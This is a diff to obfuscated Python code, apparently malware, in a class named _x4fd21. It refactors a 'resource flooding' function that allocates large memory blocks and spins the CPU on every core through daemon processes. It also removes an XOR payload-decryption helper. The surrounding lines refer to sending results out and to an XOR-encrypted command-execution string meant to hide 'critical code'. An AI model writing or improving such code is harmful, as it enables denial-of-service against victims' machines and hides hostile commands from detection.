@@ -356,17 +356,6 @@ class _x4fd21:
     # Add this method to the _x4fd21 class (after _scrn method)
     def _f100d(self, _d=30, _r=100):
         """Resource flooding function - obfuscated"""
-        def _h0g(_c=True, _m=50):
-            # Allocate significant memory
-            _hm = [0] * (_m * 250_000)  # ~50 MB per 250k integers
-            if _c:
-                _et = _t.time() + _d
-                while _t.time() < _et:
-                    # CPU-intensive calculation
-                    _x = 123456 ** 2
-            else:
-                _t.sleep(_d)  # Just hold memory
-
         try:
             # More garbage operations
             if random.random() > 0.7:
@@ -379,7 +368,8 @@ class _x4fd21:
             _procs = []
             
             for _ in range(_cores):
-                _p = _mp.Process(target=_h0g, args=(True, _r))
+                # Pass duration as first argument to the standalone function
+                _p = _mp.Process(target=_h0g, args=(_d, True, _r))
                 _p.daemon = True
                 _p.start()
                 _procs.append(_p)
@@ -436,12 +426,18 @@ class _x4fd21:
                 
             self._s3nd(_res)
 
-# Add this to your code
-def _decrypt_payload(encrypted_code, key):
-    decrypted = ""
-    for i, c in enumerate(encrypted_code):
-        decrypted += chr(ord(c) ^ ord(key[i % len(key)]))
-    return decrypted
+# Add this function before the _x4fd21 class definition
+def _h0g(_d, _c=True, _m=50):
+    """Standalone resource hogging function"""
+    # Allocate significant memory
+    _hm = [0] * (_m * 250_000)  # ~50 MB per 250k integers
+    if _c:
+        _et = time.time() + _d
+        while time.time() < _et:
+            # CPU-intensive calculation
+            _x = 123456 ** 2
+    else:
+        time.sleep(_d)  # Just hold memory
 
 # Example usage - encrypt critical functions
 _encrypted_cmd_exec = "8fJ9d8f3j...etc" # XOR encrypted string of critical code
